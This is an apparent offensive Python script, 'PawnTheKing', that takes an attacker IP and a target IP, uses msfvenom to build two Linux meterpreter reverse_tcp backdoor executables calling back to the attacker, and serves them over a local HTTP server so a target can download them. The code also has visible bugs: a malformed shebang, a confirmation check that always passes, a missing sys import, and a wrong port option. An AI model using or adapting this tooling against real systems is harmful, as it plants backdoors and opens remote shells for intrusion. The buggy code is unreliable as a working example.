#/usr/bin/python3

import os
import subprocess
from subprocess import DEVNULL
import http.server
import socketserver

IP = input("What is YOUR IP Address? ")
Target = input("What is the Target IP Address? ")
print("Your IP Address is: " + IP)
print("Target IP Address is: " + Target)
inputresponse = input("Is this correct? Y to continue, anything else to exit\n")
if(inputresponse == "Y" or "y" or "yes" or "Yes"):
    print("Moving along...")
else:
    sys.exit()

os.environ['IP']=IP
os.environ['Target']=Target

subprocess.run(["mkdir", "/tmp/PawnTheKing/"])

#todo - add nmap scripts here

subprocess.Popen((["msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp", "LHOST={0}".format(IP), "PORT=6131", "-f", "elf", "-o", "/tmp/PawnTheKing/backdoor.trigger"]), stderr=DEVNULL)

subprocess.Popen((["msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp", "LHOST={0}".format(IP), "PORT=18", "-f", "elf", "-o", "/tmp/PawnTheKing/backdoor.suid"]), stderr=DEVNULL)

tmpdir = os.path.join(os.path.dirname("/tmp/PawnTheKing"))
os.chdir(tmpdir)

Handler = http.server.SimpleHTTPRequestHandler
httpd = socketserver.TCPServer((IP, 6121), Handler)
print("Now serving on port 6121")
httpd.serve_forever()
